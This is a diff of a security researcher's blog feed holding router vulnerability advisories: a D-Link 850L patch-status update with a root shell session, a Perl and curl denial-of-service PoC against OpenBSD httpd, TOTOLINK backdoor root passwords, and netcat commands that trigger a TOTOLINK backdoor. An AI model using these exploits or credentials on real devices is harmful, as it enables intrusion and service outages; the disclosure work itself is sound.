@@ -4,6 +4,117 @@
     <title>IT Security Research by Pierre</title>
     
     <entry>
+        <title>Update - Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol</title>
+        <link href="2017-09-21-update-dlink-850l-mydlink-cloud-0days-vulnerabilities.html"/>
+        <content type="html"><p>An update on the post "<a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html">Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol</a>":</p>
+<p>MITRE was very effective and provided several CVEs for these vulnerabilities:</p>
+<p>CVE-2017-14413, CVE-2017-14414, CVE-2017-14415, CVE-2017-14416, CVE-2017-14417, CVE-2017-14418,
+CVE-2017-14419, CVE-2017-14420, CVE-2017-14421, CVE-2017-14422, CVE-2017-14423, CVE-2017-14424,
+CVE-2017-14425, CVE-2017-14426, CVE-2017-14427, CVE-2017-14428, CVE-2017-14429, CVE-2017-14430.</p>
+<p>D-Link provided firmware updates at: <a href="http://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10074">http://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10074</a>.</p>
+<p><strong>Full-Disclosure seems to work! It forced D-Link to provide working security patches to the public in a timely manner.</strong></p>
+<p>Only 14 CVEs (of 18 CVEs) are recognized in the list from the Security Announcement from D-Link. I verified myself that the vulnerabilities have been indeed patched or not - for all 18 CVEs - as shown below on a <strong>real router with the latest firmware</strong>.</p>
+<p><strong>This work was possible thanks to another pre-auth 0day exploit that I have not yet released and which still works against the latest revB firmware (<code>DIR850LB1_FW220WWb03.bin</code>).</strong></p>
+<pre><code>user@kali:~/petage-dlink$ ./pwn-dlink-850-003 192.168.0.1
+[...]
+# uname -ap
+Linux dlinkrouter 2.6.30.9 #1 Mon Sep 18 10:27:42 CST 2017 rlx GNU/Linux
+# busybox 
+BusyBox v1.14.1 (2017-09-18 20:18:33 CST) multi-call binary
+Copyright (C) 1998-2008 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+[...]
+#
+</code></pre>
+<h2>Firmware "protection"</h2>
+<p>The algorithm seems to have been updated. <a href="https://pierrekim.github.io/blog/2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html#firmware-protection">The previous program</a> doesn't work anymore. <strong>Luckily, having a root shell on the device gives me some hints about how to decipher firmware images.</strong></p>
+<h2>WAN &amp;&amp; LAN - revA - XSS - CVE-2017-14413, CVE-2017-14414, CVE-2017-14415, CVE-2017-14416</h2>
+<p>Corrected - the vulnerable files have been removed, as shown below:</p>
+<pre><code># cd /htdocs/web
+# ls -la *php
+-rw-r--r--    1 root     root          143 Sep 18  2017 wiz_mydlink.php
+-rw-r--r--    1 root     root         3768 Sep 18  2017 vpnconfig.php
+-rw-r--r--    1 root     root          204 Sep 18  2017 version.php
+-rw-r--r--    1 root     root         1074 Sep 18  2017 getcfg.php
+-rw-r--r--    1 root     root         2661 Sep 18  2017 dnslog.php
+-rw-r--r--    1 root     root          149 Sep 18  2017 bsc_mydlink.php
+#
+</code></pre>
+<h2>WAN &amp;&amp; LAN - revB - Retrieving admin password, gaining full access using the custom mydlink Cloud protocol - CVE-2017-14417, CVE-2017-14418</h2>
+<p>Corrected - the vulnerable file has been removed.</p>
+<pre><code># ls /htdocs/web/register_send.php
+ls: /htdocs/web/register_send.php: No such file or directory
+#
+</code></pre>
+<p>Note that the device still sends clear-text passwords to the Cloud protocol (www.mydlink.com).</p>
+<h2>WAN - revA and revB - Weak Cloud protocol - CVE-2017-14419, CVE-2017-14420</h2>
+<p>Not checked as this is going to be taking to much time.</p>
+<h2>LAN - revB - Backdoor access - CVE-2017-14421</h2>
+<p>Corrected.</p>
+<h2>WAN &amp;&amp; LAN - revA and revB - Stunnel private keys - CVE-2017-14422</h2>
+<p>Corrected - as shown below:</p>
+<pre><code># ls -la /etc/stunnel.key
+ls: /etc/stunnel.key: No such file or directory
+#
+</code></pre>
+<p>The new certificate (<code>/tmp/server.key</code> and <code>/tmp/server.crt</code>) is generated on-the-fly during the boot process by the <code>scripts/updatessl.sh</code> script. It's a self-signed certificate:</p>
+<pre><code># cat scripts/updatessl.sh
+[...]
+openssl req -new -newkey rsa:2048 -days $SSLDAYS -sha256 -nodes -x509 -subj "/C=TW/ST=Taiwan/L=Taipei/O=D-Link Corporation/OU=D-Link WRPD/CN=General Root CA/emailAddress=webmaster@localhost" -extensions usr_cert -keyout $TMPKEY -out $TMPPEM -config /etc/openssl.cnf -rand $TMPRAND
+[...]
+</code></pre>
+<p>This opens question about the security of the Cloud protocol.</p>
+<h2>WAN &amp;&amp; LAN - revA - Nonce bruteforcing for DNS configuration - CVE-2017-14423</h2>
+<p>Corrected - this file has been removed from the firmware image.</p>
+<h1>Local - revA and revB - Weak files permission and credentials stored in cleartext - CVE-2017-14424, CVE-2017-14425, CVE-2017-14426, CVE-2017-14427, CVE-2017-14428</h1>
+<p>Corrected - the passwords are replaced by 'x' everywhere:</p>
+<pre><code># cat /var/passwd
+"Admin" "x" "0"
+# cat /var/etc/hnapasswd
+Admin:x
+# ls -la /var/passwd
+-rw-rw-rw-    1 root     root           16 Jan  1 00:00 /var/passwd
+# cat /var/passwd
+"Admin" "x" "0"
+# ls -la /var/etc/hnapasswd
+-rw-rw-rw-    1 root     root            8 Jan  1 00:00 /var/etc/hnapasswd
+# cat /var/etc/hnapasswd
+Admin:x
+# cat /var/etc/hnapasswd
+Admin:x
+# ls -la /var/etc/hnapasswd
+-rw-rw-rw-    1 root     root            8 Jan  1 00:00 /var/etc/hnapasswd
+# ls -la /var/etc/passwd
+-rw-r--r--    1 root     root          146 Jan  1 00:00 /var/etc/passwd
+# cat /var/etc/passwd
+root:x:0:0:Linux User,,,:/home/root:/bin/sh
+nobody:x:1000:500:Linux User,,,:/home/nobody:/bin/sh
+Admin:x:1001:0:Linux User,,,:/home/Admin:/bin/sh
+# cat /var/etc/shadow
+root:!:10956:0:99999:7:::
+nobody:!:10956:0:99999:7:::
+Admin:!:10956:0:99999:7:::
+# ls -la /var/run/storage_account_root
+-rw-rw-rw-    1 root     root           12 Jan  1 00:00 /var/run/storage_account_root
+# cat /var/run/storage_account_root
+admin:x,:::
+# ls -la /var/run/hostapd*conf
+-rw-rw-rw-    1 root     root         1160 Jan  1 00:00 /var/run/hostapd-wlan1.conf
+-rw-rw-rw-    1 root     root         1170 Jan  1 00:00 /var/run/hostapd-wlan0.conf
+</code></pre>
+<h2>WAN - revB - Pre-Auth RCEs as root (L2) - CVE-2017-14429</h2>
+<p>Corrected - the variables are sanitized.</p>
+<h2>LAN - revA and revB - DoS against some daemons - CVE-2017-14430</h2>
+<p>Corrected? I don't think so.</p>
+<h2>Conclusion</h2>
+<p>I'm happily surprised by the results of dropping 0days without coordinated disclosure when it is about D-Link products. Should this be the only method with D-Link to get working security patches in a timely manner?</p>
+<p>Hopefully one day a coordinated disclosure could work in the same way.</p>
+<h2>Disclaimer</h2>
+<p>This research is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
+    </entry>
+    
+    <entry>
         <title>Pwning the Dlink 850L routers and abusing the MyDlink Cloud protocol</title>
         <link href="2017-09-08-dlink-850l-mydlink-cloud-0days-vulnerabilities.html"/>
         <content type="html"><h2>Product Description</h2>
@@ -2147,9 +2258,9 @@ Host: fill-me-with-joy
 <p>Here is a provided PoC (loosely based on KingCope's apache_killer.pl):</p>
 <div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #408080; font-style: italic">#!/usr/bin/perl -w</span>
 
-<span style="color: #008000; font-weight: bold">use</span> warnings;
-<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">IO::</span>Socket;
-<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">Parallel::</span>ForkManager;
+<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">warnings</span>;
+<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">IO::Socket</span>;
+<span style="color: #008000; font-weight: bold">use</span> <span style="color: #0000FF; font-weight: bold">Parallel::ForkManager</span>;
 
 <span style="color: #19177C">$numforks</span> <span style="color: #666666">=</span> <span style="color: #666666">50</span>;
 
@@ -2163,12 +2274,12 @@ Host: fill-me-with-joy
   <span style="color: #666666">&amp;</span>killhttpd();
 }
 
-<span style="color: #008000; font-weight: bold">sub </span><span style="color: #0000FF">usage</span> {
+<span style="color: #008000; font-weight: bold">sub</span> <span style="color: #0000FF">usage</span> {
   <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;OpenBSD HTTP Remote Denial of Service (memory exhaustion) - @PierreKimSec\n&quot;</span>;
   <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;usage: perl killobsdhttpd.pl &lt;host&gt; &lt;remotefile&gt;\n&quot;</span>;
 }
 
-<span style="color: #008000; font-weight: bold">sub </span><span style="color: #0000FF">killhttpd</span> {
+<span style="color: #008000; font-weight: bold">sub</span> <span style="color: #0000FF">killhttpd</span> {
   <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;ATTACKING $ARGV[0] [using $numforks forks]\n&quot;</span>;
 
   <span style="color: #19177C">$pm</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> <span style="color: #0000FF; font-weight: bold">Parallel::</span>ForkManager(<span style="color: #19177C">$numforks</span>);
@@ -2176,7 +2287,7 @@ Host: fill-me-with-joy
   <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #666666">0</span> <span style="color: #666666">..</span> <span style="color: #19177C">$numforks</span>)
   {
     <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">$pid</span> <span style="color: #666666">=</span> <span style="color: #19177C">$pm</span><span style="color: #666666">-&gt;</span>start <span style="color: #AA22FF; font-weight: bold">and</span> <span style="color: #008000; font-weight: bold">next</span>;
-    <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">$sock</span> <span style="color: #666666">=</span> <span style="color: #0000FF; font-weight: bold">IO::Socket::</span>INET<span style="color: #666666">-&gt;</span><span style="color: #008000; font-weight: bold">new</span>(PeerAddr <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$ARGV</span>[<span style="color: #666666">0</span>],
+    <span style="color: #008000; font-weight: bold">my</span> <span style="color: #19177C">$sock</span> <span style="color: #666666">=</span> <span style="color: #0000FF; font-weight: bold">IO::Socket::INET</span><span style="color: #666666">-&gt;</span><span style="color: #008000; font-weight: bold">new</span>(PeerAddr <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$ARGV</span>[<span style="color: #666666">0</span>],
                                      PeerPort <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&quot;80&quot;</span>,
                                      Proto    <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;tcp&#39;</span>);
     <span style="color: #19177C">$p</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;GET $ARGV[1] HTTP/1.1\r\nRange: bytes=1-\r\nAccept: */*\r\nHost: $ARGV[0]\r\nConnection: close\r\n\r\n&quot;</span>;
@@ -2201,17 +2312,17 @@ all the RAM. The OpenBSD system will likely freeze within minutes.</p>
 <span style="color: #008000">unset</span> http_proxy
 <span style="color: #008000">unset</span> https_proxy
 
-<span style="color: #008000; font-weight: bold">for</span> i in <span style="color: #008000; font-weight: bold">$(</span>seq <span style="color: #666666">0</span> 300<span style="color: #008000; font-weight: bold">)</span>
+<span style="color: #008000; font-weight: bold">for</span> i in <span style="color: #008000; font-weight: bold">$(</span>seq <span style="color: #666666">0</span> <span style="color: #666666">300</span><span style="color: #008000; font-weight: bold">)</span>
 <span style="color: #008000; font-weight: bold">do</span>
   <span style="color: #008000">echo</span> sending a req
-  curl --limit-rate <span style="color: #666666">1</span> --continue-at <span style="color: #666666">1</span> --header <span style="color: #BA2121">&quot;Host: </span><span style="color: #19177C">$1</span><span style="color: #BA2121">&quot;</span> http://<span style="color: #19177C">$1</span>/<span style="color: #19177C">$2</span> 2&gt;/dev/null &gt;/dev/null &amp;
-  sleep 0.5
+  curl --limit-rate <span style="color: #666666">1</span> --continue-at <span style="color: #666666">1</span> --header <span style="color: #BA2121">&quot;Host: </span><span style="color: #19177C">$1</span><span style="color: #BA2121">&quot;</span> http://<span style="color: #19177C">$1</span>/<span style="color: #19177C">$2</span> <span style="color: #666666">2</span>&gt;/dev/null &gt;/dev/null &amp;
+  sleep <span style="color: #666666">0</span>.5
   pkill curl
 <span style="color: #008000; font-weight: bold">done</span>
-<span style="color: #008000; font-weight: bold">while</span> sleep 1
+<span style="color: #008000; font-weight: bold">while</span> sleep <span style="color: #666666">1</span>
 <span style="color: #008000; font-weight: bold">do</span>
   <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;sending a req (slow)&quot;</span>
-  curl --limit-rate <span style="color: #666666">1</span> --continue-at <span style="color: #666666">1</span> --header <span style="color: #BA2121">&quot;Host: </span><span style="color: #19177C">$1</span><span style="color: #BA2121">&quot;</span> http://<span style="color: #19177C">$1</span>/<span style="color: #19177C">$2</span> 2&gt;/dev/null &gt;/dev/null &amp;
+  curl --limit-rate <span style="color: #666666">1</span> --continue-at <span style="color: #666666">1</span> --header <span style="color: #BA2121">&quot;Host: </span><span style="color: #19177C">$1</span><span style="color: #BA2121">&quot;</span> http://<span style="color: #19177C">$1</span>/<span style="color: #19177C">$2</span> <span style="color: #666666">2</span>&gt;/dev/null &gt;/dev/null &amp;
   pkill curl
 <span style="color: #008000; font-weight: bold">done</span>
 </pre></div>
@@ -8568,148 +8679,6 @@ Note that this laptop can be ordered without Windows, and <a href="https://pierr
     </entry>
     
     <entry>
-        <title>Backdoor credentials found in 4 TOTOLINK router models</title>
-        <link href="2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html"/>
-        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA512
-
-## Advisory Information
-
-Title: Backdoor credentials found in 4 TOTOLINK router models
-Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x03.txt
-Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html
-Date published: 2015-07-16
-Vendors contacted: None
-Release mode: 0days, Released
-CVE: no current CVE
-
-
-
-## Product Description
-
-TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
-TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.
-
-
-
-## Vulnerabilities Summary
-
-Backdoor credentials are present in several TOTOLINK products.
-
-It affects 4 TOTOLINK products (firmwares come from totolink.net and from totolink.cn):
-
-- G150R-V1 : last firmware 1.0.0-B20150330 (TOTOLINK-G150R-V1.0.0-B20150330.1734.web)
-- G300R-V1 : last firmware 1.0.0-B20150330 (TOTOLINK-G300R-V1.0.0-B20150330.1816.web)
-- N150RH-V1 : last firmware 1.0.0-B20131219 (TOTOLINK-N150RH-V1.0.0-B20131219.1014.web)
-- N301RT-V1 : last firmware 1.0.0 (TOTOLINK N301RT_V1.0.0.web)
-
-It allows an attacker in the LAN to connect to the device using telnet with 2 different accounts: root and 'onlime_r' which gives with root privileges.
-
-
-
-## Details - G150R-V1 and G300R-V1
-
-The init.d script executes these commands when the router starts:
-
-[...]
-cp /etc/passwd_orig /var/passwd
-cp /etc/group_orig /var/group
-telnetd&amp;
-[...]
-
-
-The /etc/passwd_orig contains backdoor credentials:
-
-root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
-onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
-nobody:x:0:0:nobody:/:/dev/null
-
-The corresponding passwords are:
-
-root:12345
-onlime_r:12345
-
-
-## Details - N150RH-V1 and N301RT
-
-The init.d script executes these commands when the router starts:
-
-[...]
-#start telnetd
-telnetd&amp;
-[...]
-
-The binary /bin/sysconf executes these commands when the router starts:
-
-system("cp /etc/passwd.org /var/passwd 2&gt; /dev/null")
-
-
-The /etc/passwd.org contains backdoor credentials:
-
-root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
-onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
-nobody:x:0:0:nobody:/:/dev/null
-
-The corresponding passwords are:
-
-root:12345
-onlime_r:12345
-
-
-
-## Vendor Response
-
-TOTOLINK was not contacted in regard of this case.
-
-
-
-## Report Timeline
-
-* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
-* Jun 26, 2015: working PoCs.
-* Jul 16, 2015: A public advisory is sent to security mailing lists.
-
-
-
-## Credit
-
-These backdoor credentials were found Pierre Kim (@PierreKimSec).
-
-
-
-## References
-
-https://pierrekim.github.io/advisories/2015-totolink-0x03.txt
-
-
-
-## Disclaimer
-
-This advisory is licensed under a Creative Commons Attribution Non-Commercial
-Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
-
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCgAGBQJVq/MNAAoJEMQ+Dtp9ky28FroP/jM/FCTlC93R5bdmPzn7l0kR
-247lhuqqMO689jGkz3kiTqUIEidKoAluH6xqs2xhqVMYie9CfrWsRwrbuF+5RSkZ
-jmzvGVH2teGBuJ70+hVY81FvEsleG5eCdz4nZXKPcyLMfSw0HxxBp4ooCDQsSj2f
-WAgKfQmKY123TLAwE+R51z2ZXPlxMIyRyjy33utQk5wtDCK0gqOtsFqA7CLtJgth
-EBi2YjrxNDM8FYJx4f7A8RBAOp34rHQx/xn2yvylwUkwZ8P0LcC9EmMPZUo0q3xu
-dIfPV1HJWlYyPVxqXg9ATWvODBbAyOWpf0/CwBsRmZVRbJL7/9tCzDYRwrm9PFgJ
-Od47n+82UfvD1aiAQxdm983Rf5i2t2ssW/e2fr9jOiWqIQChc/eRmUpso8Okluzo
-ZUVxhJGBigAsd+Z0FRCeBUki8LUKCAtbfe7Vkn/v5AlOamyc/VNOQNZpbbqa1SUv
-64DaPOhzXQ6WBGkzwxWOHy+qfQT+7/dfGZ7i6n7TwV4tIJm6yLioPBp7F1WceWh6
-KySutfVi0wpIf8mcbigsdaHmPqGSNxKnbitr8GETdV+WME5REvn9d8DhSJ7Cy+Eh
-PNPDAdSZES8WPl0f5QCNgNUxrCsFM7DLW6P15HFI/NqFzLAdifqT6IKeQtXTdYwH
-g9PPILKUXFZssc0SceTB
-=pLPu
------END PGP SIGNATURE-----
-</code></pre></content>
-    </entry>
-    
-    <entry>
         <title>4 TOTOLINK router models vulnerable to CSRF and XSS attacks</title>
         <link href="2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html"/>
         <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
@@ -9001,6 +8970,488 @@ G0xg6mqZa2ZIt2FbWmMgo/+t04aBaUGB4y5tIeILWH2FFrHlpyvtuU5IMys/DiO+
 7Nr8g4RTEskP8x2/TAh05YJYcY8Bai5RTAQaTwT3cUNdp3B8UiLxtVwfTzmI4//F
 bjG1WlLuMMpz1dwPfEB6
 =c3Q7
+-----END PGP SIGNATURE-----
+</code></pre></content>
+    </entry>
+    
+    <entry>
+        <title>Backdoor credentials found in 4 TOTOLINK router models</title>
+        <link href="2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html"/>
+        <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+## Advisory Information
+
+Title: Backdoor credentials found in 4 TOTOLINK router models
+Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x03.txt
+Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html
+Date published: 2015-07-16
+Vendors contacted: None
+Release mode: 0days, Released
+CVE: no current CVE
+
+
+
+## Product Description
+
+TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
+TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.
+
+
+
+## Vulnerabilities Summary
+
+Backdoor credentials are present in several TOTOLINK products.
+
+It affects 4 TOTOLINK products (firmwares come from totolink.net and from totolink.cn):
+
+- G150R-V1 : last firmware 1.0.0-B20150330 (TOTOLINK-G150R-V1.0.0-B20150330.1734.web)
+- G300R-V1 : last firmware 1.0.0-B20150330 (TOTOLINK-G300R-V1.0.0-B20150330.1816.web)
+- N150RH-V1 : last firmware 1.0.0-B20131219 (TOTOLINK-N150RH-V1.0.0-B20131219.1014.web)
+- N301RT-V1 : last firmware 1.0.0 (TOTOLINK N301RT_V1.0.0.web)
+
+It allows an attacker in the LAN to connect to the device using telnet with 2 different accounts: root and 'onlime_r' which gives with root privileges.
+
+
+
+## Details - G150R-V1 and G300R-V1
+
+The init.d script executes these commands when the router starts:
+
+[...]
+cp /etc/passwd_orig /var/passwd
+cp /etc/group_orig /var/group
+telnetd&amp;
+[...]
+
+
+The /etc/passwd_orig contains backdoor credentials:
+
+root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
+onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
+nobody:x:0:0:nobody:/:/dev/null
+
+The corresponding passwords are:
+
+root:12345
+onlime_r:12345
+
+
+## Details - N150RH-V1 and N301RT
+
+The init.d script executes these commands when the router starts:
+
+[...]
+#start telnetd
+telnetd&amp;
+[...]
+
+The binary /bin/sysconf executes these commands when the router starts:
+
+system("cp /etc/passwd.org /var/passwd 2&gt; /dev/null")
+
+
+The /etc/passwd.org contains backdoor credentials:
+
+root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
+onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
+nobody:x:0:0:nobody:/:/dev/null
+
+The corresponding passwords are:
+
+root:12345
+onlime_r:12345
+
+
+
+## Vendor Response
+
+TOTOLINK was not contacted in regard of this case.
+
+
+
+## Report Timeline
+
+* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
+* Jun 26, 2015: working PoCs.
+* Jul 16, 2015: A public advisory is sent to security mailing lists.
+
+
+
+## Credit
+
+These backdoor credentials were found Pierre Kim (@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2015-totolink-0x03.txt
+
+
+
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJVq/MNAAoJEMQ+Dtp9ky28FroP/jM/FCTlC93R5bdmPzn7l0kR
+247lhuqqMO689jGkz3kiTqUIEidKoAluH6xqs2xhqVMYie9CfrWsRwrbuF+5RSkZ
+jmzvGVH2teGBuJ70+hVY81FvEsleG5eCdz4nZXKPcyLMfSw0HxxBp4ooCDQsSj2f
+WAgKfQmKY123TLAwE+R51z2ZXPlxMIyRyjy33utQk5wtDCK0gqOtsFqA7CLtJgth
+EBi2YjrxNDM8FYJx4f7A8RBAOp34rHQx/xn2yvylwUkwZ8P0LcC9EmMPZUo0q3xu
+dIfPV1HJWlYyPVxqXg9ATWvODBbAyOWpf0/CwBsRmZVRbJL7/9tCzDYRwrm9PFgJ
+Od47n+82UfvD1aiAQxdm983Rf5i2t2ssW/e2fr9jOiWqIQChc/eRmUpso8Okluzo
+ZUVxhJGBigAsd+Z0FRCeBUki8LUKCAtbfe7Vkn/v5AlOamyc/VNOQNZpbbqa1SUv
+64DaPOhzXQ6WBGkzwxWOHy+qfQT+7/dfGZ7i6n7TwV4tIJm6yLioPBp7F1WceWh6
+KySutfVi0wpIf8mcbigsdaHmPqGSNxKnbitr8GETdV+WME5REvn9d8DhSJ7Cy+Eh
+PNPDAdSZES8WPl0f5QCNgNUxrCsFM7DLW6P15HFI/NqFzLAdifqT6IKeQtXTdYwH
+g9PPILKUXFZssc0SceTB
+=pLPu
+-----END PGP SIGNATURE-----
+</code></pre></content>
+    </entry>
+    
+    <entry>
+        <title>Backdoor and RCE found in 8 TOTOLINK router models</title>
+        <link href="2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html"/>
+        <content type="html"><h2>Product Description</h2>
+<p>TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
+TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.</p>
+<h2>Vulnerabilities Summary</h2>
+<p>A backdoor is present in several TOTOLINK products.
+This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.</p>
+<p>At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):</p>
+<ul>
+<li>A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web</li>
+<li>F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web</li>
+<li>F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web</li>
+<li>N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web</li>
+<li>N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web</li>
+<li>N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web</li>
+<li>N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web</li>
+<li>N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web</li>
+</ul>
+<p>By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
+Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.</p>
+<p>We estimate there are =~ 50 000 routers affected by this backdoor.</p>
+<h2>Details - backdoor</h2>
+<p>The /etc/init.d/rcS script executes the /bin/skt binary when the router starts:</p>
+<pre><code>cat etc/init.d/rcS
+[...]
+# start web server
+boa
+skt&amp;
+</code></pre>
+<p>skt is a small MIPS binary which is a client/server program. The arguments are:</p>
+<pre><code>server: ./skt
+client: ./skt host cmd
+</code></pre>
+<p>The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt</p>
+<p>Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
+Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.</p>
+<p>There are 2 main functions in <code>skt</code>:</p>
+<ul>
+<li>TcpClient is a simple TCP client.</li>
+<li>TcpServer looks like an echo server.</li>
+</ul>
+<p><strong>TcpClient:</strong></p>
+<p>It will send a TCP packet containing hel,xasf, oki,xasf or bye,xasf, depending the arguments used (1,2,3), to a remote IP on port 5555.</p>
+<p><strong>TcpServer:</strong></p>
+<p>TcpServer is an echo server listening on port 5555/tcp and  it compares strings provided by the user with hardcoded
+strings ("hel,xasf", "oki,xasf").</p>
+<p>The problem is in the sub_400B50 function:</p>
+<p><img alt="" src="images/2015-totolink-0x02-backdoor-00.png" /></p>
+<p><strong>Pseudo-code of sub_400B50:</strong></p>
+<pre><code>int32_t sub_400B50(int32_t a1, char *str, int32_t a3, int32_t a4, int32_t a5) {
+    if (strcmp(str, "hel,xasf") == 0) {
+        system("iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
+    } else {
+        if (strcmp(str, "oki,xasf") == 0) {
+            system("iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
+        }
+    }
+    [...]
+}
+</code></pre>
+<p>This function compares str, which is an user-given string, with 2 hardcoded strings to execute system().</p>
+<p>The analysis of the binary running on the TOTOLINK devices shows the server mode responds to 3 commands by silently executing
+system() in the background:</p>
+<ul>
+<li>
+<p>By sending "hel,xasf" to the device, the device will execute:</p>
+<p>iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT</p>
+<p>This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.</p>
+</li>
+<li>
+<p>By sending "oki,xasf" to the device, the device will execute:</p>
+<p>iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT </p>
+<p>This will close the HTTP remote management interface.</p>
+</li>
+<li>
+<p>By sending "bye,xasf" (hardcoded string in the binary) to the device, the device will do nothing</p>
+</li>
+</ul>
+<p>The iptables commands in the backdoor are hardcoded with "eth1".
+Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.</p>
+<p>It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:</p>
+<pre><code>totolink# ifconfig
+ppp0      Link encap:Point-to-Point Protocol  
+          inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
+          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
+          RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:64 
+          RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
+</code></pre>
+<p>An attacker can use these simple netcat commands to test the backdoor:</p>
+<p>To open the HTTP remote management interface on the Internet:</p>
+<pre><code>echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
+</code></pre>
+<p>To close the HTTP remote management interface on the Internet:</p>
+<pre><code>echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
+</code></pre>
+<p>To detect a vulnerable router:</p>
+<pre><code>echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555
+
